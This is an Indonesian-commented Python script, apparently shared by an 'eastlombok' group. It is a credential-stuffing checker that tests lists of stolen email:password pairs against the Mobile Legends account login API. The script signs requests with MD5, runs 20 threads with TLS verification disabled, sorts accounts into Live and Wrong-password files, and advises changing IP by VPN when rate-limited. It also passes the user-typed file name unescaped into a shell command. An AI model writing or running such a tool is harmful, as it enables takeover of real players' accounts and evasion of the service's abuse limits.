import requests, os, random, sys, json, hashlib, time
from concurrent.futures import ThreadPoolExecutor
requests.packages.urllib3.disable_warnings()
print('''\033[0m

                   __  __                __          __ 
  ___  ____ ______/ /_/ /___  ____ ___  / /_  ____  / /__
 / _ \/ __ `/ ___/ __/ / __ \/ __ `__ \/ __ \/ __ \/ //_/
/  __/ /_/ (__  ) /_/ / /_/ / / / / / / /_/ / /_/ / ,< 
\___/\__,_/____/\__/_/\____/_/ /_/ /_/_.___/\____/_/|_|
\n''')

# untuk ambil token ke elt
# klo bisa jangan di hapus yang ini
def get_tokens():
    try:
      file = open('token.txt', 'r')
      teks = file.read() 
      return teks
    except:exit("File token error")
token = get_tokens()

# untuk cek token ke elt
def cek_token(token):
    try:
      response_api = requests.get("https://eastlombok.site/restApi/cekKey.php?key="+token+"&tipe=amazonV3", headers={'User-Agent': 'Mozilla/5.0'})
      # print(response_api);
      return response_api
    except: exit('Something error, try again\n')
cek_tokens = cek_token(token)  
if cek_tokens.status_code != 200:exit('Token is not valid')


# list untuk nyimpen data empas
userdata = []

empas = input(' hapus result sebelumnya [y/n] : ')
if empas.lower() == 'y' :
  # hapus file
  open('result/Live.txt','w').write('')
  open('result/Register.txt','w').write('')
  open('result/Die.txt','w').write('')
  open('result/Unknown.txt','w').write('')
elif empas.lower() == 'n' :
  pass
else: exit('\n input yang bener.. :(')

empas = input(' masukkan nama file/combo gayn: ')
print(" [*]Wait...")
# fungsi untuk menghapus list empas per line
os.system("php lib/func.php "+empas)
time.sleep(2)

# pengecekan empas dan pengembilan empas
if os.path.exists(
      empas
    ):
  for data in open( empas,'r',encoding='utf-8').readlines():
    try:
      user = data.strip().split(':')
      if user[0] and user[1]:
        em = user[0]
        pw = user[1]
        userdata.append({'email': em,'pw': pw,'userdata':':'.join([em,pw])})
    except: pass
  if len(userdata) == 0:
    exit('[!] Combo is empty')

# pembuatan data body dengan mengubahnya menjadi md5
def hash_md5(string):
    md5 = hashlib.new('md5')
    md5.update(string.encode('utf-8'))
    return md5.hexdigest()
# pembuatan data body yg siap di send ke server moonton
def build_params(user):

    md5pwd = hash_md5(
      user['pw']
    )
    hashed = hash_md5(
      "account="+user['email']+"&md5pwd="+md5pwd+"&op=login".format(
        user['email']+md5pwd)
    )

    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user['email'],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })
    
# fungsi untuk mengecek data empas dan mengeluarkan output
def check(user,opsi = 'y'):
  try:
    global empas
    
    headers = {
        'host': 'accountmtapi.mobilelegends.com',
        'user-agent': 'Mozilla/5.0',
        'x-requested-with': 'com.mobile.legends'
    }
    url = 'https://accountmtapi.mobilelegends.com/'
    datas = build_params(user)
    getData = requests.post(
      url, 
      data=datas,
      headers=headers,
      timeout=10,
      verify=False
      )
    # pengecekan apakah data ke send dengan benar daan server membalas dengan benar
    if getData.status_code == 200:
      x = getData.json()['message']
      
      # pengecekan setatus empas user
      if x == 'Error_NoAccount':
        print(
            '\r [\033[0;31mDIEE\033[0m] '+user[
              'userdata'
            ]+' -> (\033[0;31mWrong email\033[0m)'
        )
        open('result/Die.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_Success':
        print(
            '\r [\033[92mLIVE\033[0m] '+user[
              'userdata'
             ]+' -> (\033[92mSuccess login\033[0m)'
        )
        open('result/Live.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_PasswdError':
        print(
            '\r [\033[0;31mRegister\033[0m] '+user[
              'userdata'
            ]+' -> (\033[0;31mWrong password\033[0m)'
        )
        open('result/Register.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_PwdErrorTooMany':
        print(
            '\r [\033[0;31mLimit\033[0m] '+user[
              'userdata'
            ]+' -> (\033[0;31mLimit login\033[0m)'
        )
        open("trash/cache.txt", "a").write(str(user['userdata'])+'\n')
      elif x == 'Error_FailedTooMuch':
        print(
            '\r [\033[7;93mWait (ganti ip anda dengan vpn)\033[0m] '+user[
              'userdata'
            ]+' -> (\033[7;93mTry again\033[0m)'
        )
      else:
        print(
            '\r [\033[7;93mUnknown\033[0m] '+user[
              'userdata'
            ]+' -> (\033[7;93mUnknown\033[0m)'
        )
        open('result/Unknown.txt','a').write(str(user
              [
                'userdata'
              ]
            )+'\n'
          )
      print(
          end='\r [*] Checked:By osyi cozy (eastlombok@team)',
          flush=True
        )
    else:
        pass
  except:
    pass
opsi = input( " [?]Pakai Thread atau tidak [y/n]?" )
if opsi.lower() == "y" or opsi.lower() == "yes":
  with ThreadPoolExecutor(max_workers=20) as thread:
          [
            thread.submit(
              check,
              user
            ) for user in userdata
          ]
elif opsi.lower() == "n" or opsi.lower() == "no":
  for user in userdata:
    check(user, "n")
    time.sleep(0.5)
else : exit(' [*]pilih yang bener!')